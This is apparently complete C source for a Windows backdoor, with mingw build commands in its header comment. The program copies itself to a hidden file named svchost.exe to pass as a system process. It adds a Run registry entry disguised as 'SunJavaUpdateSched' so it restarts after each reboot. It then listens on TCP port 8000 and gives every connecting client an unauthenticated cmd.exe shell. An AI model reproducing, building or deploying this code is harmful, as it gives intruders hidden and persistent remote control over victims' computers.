/*
i586-mingw32msvc-gcc -Os -c code.c
i586-mingw32msvc-ld code.o -lws2_32 -lkernel32 -lshell32 -lmsvcrt -ladvapi32 -subsystem=windows
i586-mingw32msvc-strip a.exe
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

//int main(int argc, char *argv[]){
int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	       LPSTR lpCmdLine, int nCmdShow){

	HANDLE hHeap;
	PSTR sDst, sSrc;
	HKEY hkReg;
	LONG ret;
	DWORD len;

	WSADATA wsaData;
	struct sockaddr_in serv;
	SOCKET sock, cli;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	
	/*hHeap = GetProcessHeap();
	sDst = (PSTR)RtlAllocateHeap(hHeap, NULL, 0x104);*/
	sDst = malloc(0x104);
	if(sDst == NULL){
		ExitProcess(0);
	}
	//sSrc = (PSTR)RtlAllocateHeap(hHeap, NULL, 0x104);
	sSrc = malloc(0x104);
	if(sSrc == NULL){
		ExitProcess(0);
	}
	
	
	ExpandEnvironmentStrings("\%ALLUSERSPROFILE\%\\svchost.exe", sDst, 0x104);
	GetModuleFileName(NULL , sSrc, 0x104);
	CopyFileA(sSrc, sDst, 0);
	SetFileAttributes(sDst, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	
	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
			0, KEY_WRITE, &hkReg);

	if (ret != 0){
		ret = RegOpenKeyEx(HKEY_CURRENT_USER, 
				"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
				0, KEY_WRITE, &hkReg);
	}
	if (ret == 0){
		len = strlen(sDst) + 1; // +1 ?
		RegSetValueEx(hkReg, "SunJavaUpdateSched", 0, 1, sDst, len);
		RegCloseKey(hkReg);
	}

	WSAStartup(MAKEWORD(1, 1), &wsaData);
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = 0;
	serv.sin_port = ntohs(0x1f40);

	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (sock == -1){
		ExitProcess(0);
	}

	ret = bind(sock, (SOCKADDR *) &serv, sizeof(serv));
	if (ret == -1){
		ExitProcess(0);
	}

	ret = listen(sock, 5);
	if (ret == -1){
		ExitProcess(0);
	}

	while(1){
		ZeroMemory(&si, sizeof(STARTUPINFO));

		cli = accept(sock, 0, 0);
		si.cb = sizeof(STARTUPINFO);
		si.hStdInput = (HANDLE)cli;
		si.hStdOutput = (HANDLE)cli;
		si.hStdError = (HANDLE)cli;
		si.wShowWindow = 0;
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		
		CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 
				0, NULL, NULL, &si, &pi);
	}
}
